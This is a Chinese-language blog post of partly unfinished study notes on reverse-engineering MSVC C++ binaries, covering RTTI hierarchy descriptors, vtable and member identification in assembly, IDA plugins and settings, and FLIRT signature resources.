通过RTTI识别多态类关系我们在之前的RTTI中讲到RTTIClassHierarchyDescriptor结构体如下 Offset Type Name Description 0x00 DW signature Always 0 ？ 0x04 DW attributes Bit 0 - multiple inheritance;Bit 1 - virtual inheritance 0x08 DW numBaseClasses number of base classes, Count includes the class itself 0x0c DW pBaseClassArray Array of RTTIBaseClassDescriptor 我们可以通过这个结构体的pBaseClassArray数组来判断非直接基类，如：类A有基类类B，类C，但是类B中存在类C，那么类C就是类A的非直接基类。以下为关系图 而其结构图如下 识别类的成员识别类成员是一个简单明了的过程，尽管缓慢而乏味。我们可以通过查找相对于此指针的偏移量访问来识别类成员变量： 我们还可以通过查找对相对于此对象虚拟函数表偏移量的指针的间接调用来识别虚拟函数成员： 通过检查此指针是否作为隐藏参数传递给函数调用，可以识别非虚拟成员函数。 为了确保这确实是一个成员函数，我们可以检查被调用的函数是否使用ecx，而无需首先初始化它。让我们看看sub_401110的代码 通过指针偏移量来进行成员变量的赋值 mov dword ptr[eax+8], 12345h 通过vftable指针来获取虚函数，关键为mov edx, [ecx],获取了虚函数指针指向的地址，然后通过mov eax, [edx+4]获取虚函数指针 通过lea ecx,[ebp_var_c]，隐藏传递参数给函数调用，注意此处不是64位二进制文件 同时检查被调用的函数是否使用ecx而无需初始化，也就是直接使用之前隐藏传递进来给函数调用的对象指针 Automationto be continuing… STLSTL代码和导入的DLL。确定示例是否为C++二进制文件的另一种方法是目标是否使用STL代码，该代码可以通过导入函数或库签名标识（如IDA的FLIRT）确定： to be continueing… reverse c++ binary 还原类的构造函数 还原类的析构函数 还原类的成员函数 还原类的虚函数 还原类的继承层次 判断一个类是否是抽象类 References Lesson 6: Introduction to Reversing C++ Binaries blackhat Automation Techniques in C++ Reverse Engineering Ready IDA HexRaysPyTools: Extremely useful for quickly creating structures without having to find every offset that might be a field. Classy: Makes working with vtables and child classes a lot easier. other settings Make sure to regularly create a snapshot of your database Create/open database make sure the compiler options are correct (Optional)Always show demangled names (Options → Demangled names → Select Names) theoryclass layout in Memory1234567891011// Ususally stored in the data sectionstruct vtable{ void (*func1)(); void (*func2)();};tstruct class{ vtable* vtbl; int member1; int member2;} decompilerthis patterns means below in decompiler 1234__int64 v1 = operater new(sizeof(class));*v1 = gvtable; // stored someware in .data*(v1+4) = 0;*(v1+8) = 0; call a vtable function 1(*(void (*)())(*(_QWORD*)v1 + 8))(); Reconstruct Classto be continue… 异常处理to be continue… 符号恢复to be continue… https://github.com/push0ebp/sig-database https://github.com/Maktm/FLIRTDB https://github.com/maroueneboubakri/lscanDW","link":"/2022/05/22/cppLearning/"}],"tags":[{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"msvc","slug":"msvc","link":"/tags/msvc/"},{"name":"ollvm dumpulator ransomeware","slug":"ollvm-dumpulator-ransomeware","link":"/tags/ollvm-dumpulator-ransomeware/"},{"name":"Ransomeware","slug":"Ransomeware","link":"/tags/Ransomeware/"},{"name":"Ransomeware,Conti v3","slug":"Ransomeware-Conti-v3","link":"/tags/Ransomeware-Conti-v3/"},{"name":"c++","slug":"c","link":"/tags/c/"}],"categories":[]}